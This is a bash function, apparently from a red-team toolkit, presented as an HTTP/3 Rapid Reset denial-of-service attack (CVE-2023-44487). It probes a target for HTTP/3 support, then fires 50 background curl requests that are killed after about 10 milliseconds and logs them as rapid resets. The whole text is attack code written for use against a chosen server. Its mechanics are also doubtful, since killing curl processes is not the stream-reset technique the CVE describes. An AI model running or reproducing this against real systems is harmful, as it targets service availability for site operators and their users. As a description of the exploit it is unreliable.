rt_99_http3_rapid_reset() {
    local target="${1:-$TARGET}"
    echo "[RT-99] HTTP/3 Rapid Reset (CVE-2023-44487)"
    local host=$(echo "$target" | sed 's|https\?://||' | cut -d/ -f1)
    # Check HTTP/3 support
    local resp; resp=$(curl -sk --max-time 8 \
        -H "User-Agent: $UA" \
        --http3-only \
        "${target}/" 2>/dev/null)
    if [[ -n "$resp" ]]; then
        echo "[HTTP3] ${host} supports HTTP/3" >> "$OUTPUT_DIR/rt99_http3_rapid_reset.txt"
    fi
    # Quick reset loop via ngtcp2/curl
    for i in $(seq 1 50); do
        (
            curl -sk --max-time 3 --http3-only \
                -H ":method: HEAD" \
                -H ":scheme: https" \
                -H ":authority: ${host}" \
                -H ":path: /" \
                "${target}/" 2>/dev/null &
            sleep 0.01
            kill $! 2>/dev/null
        ) &
    done
    wait 2>/dev/null
    echo "[HTTP3-RAPID-RESET] 50 rapid reset sent to ${host}" >> "$OUTPUT_DIR/rt99_http3_rapid_reset.txt"
}

